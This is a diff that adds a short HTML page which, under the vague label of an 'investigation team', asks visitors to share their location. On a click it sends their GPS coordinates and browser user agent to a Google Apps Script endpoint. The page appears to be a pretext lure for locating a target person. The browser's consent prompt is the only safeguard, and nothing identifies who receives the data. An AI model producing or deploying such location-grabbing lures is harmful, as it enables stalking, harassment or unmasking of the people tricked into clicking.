@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Share My Location</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial; text-align: center; padding: 2rem; }
+    button { padding: 10px 20px; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <h2>Location Confirmation</h2>
+  <p>Click the button below to share your location with the investigation team.</p>
+  <button onclick="sendLocation()">Share Location</button>
+  <p id="status"></p>
+
+  <script>
+    const endpoint = "https://script.google.com/macros/s/AKfycbxZD3fsNAn4KvniZ6tqZ-BZuvYrxwG3oD-u8kGKfWfCzTwgf7oE2bYFhsYeRWvEj-dzbg/exec";
+
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            fetch(endpoint, {
+              method: "POST",
+              mode: "no-cors",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                userAgent: navigator.userAgent
+              })
+            });
+            document.getElementById("status").innerText = "Location sent successfully.";
+          },
+          (err) => {
+            document.getElementById("status").innerText = "Error: " + err.message;
+          }
+        );
+      } else {
+        document.getElementById("status").innerText = "Geolocation not supported by this browser.";
+      }
+    }
+  </script>
+</body>
+</html>
